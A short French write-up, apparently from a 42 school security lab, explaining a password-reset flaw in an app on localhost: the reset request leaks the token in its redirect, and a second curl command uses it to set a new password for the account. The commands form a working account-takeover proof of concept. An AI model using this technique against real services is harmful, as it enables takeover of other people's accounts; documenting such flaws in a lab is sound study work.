
## Reproduire la faille:



## Explication de la faille:
Sur la page 'Reset password', lorsque l'on envoie un requete de reinitialisation de mot de passe, par exemple pour l'email "email=jdoe@student.42.tech"

   ```
   curl -si -X POST 'http://localhost:4942/reset-password/request' \
     --data-urlencode 'email=jdoe@student.42.tech'
   ```

On recoit la reponse suivante:

   ```
   HTTP/1.1 302 Found
   location: /reset-password?email=jdoe@student.42.tech&token=5ae99e7ca0a3fd84337cecfa705f5321
   ```

On recoit donc le token de reinitialisation de mot de passe directement !
On peut donc se servir de cette faille pour surcharger et modifier le mot de passe de ce compte:

   ```
   curl -si -X POST 'http://localhost:4942/reset-password/confirm' \
     --data-urlencode 'email=jdoe@student.42.tech' \
     --data-urlencode 'token=5ae99e7ca0a3fd84337cecfa705f5321' \
     --data-urlencode 'new_password=Qwerty1234!'
   ```
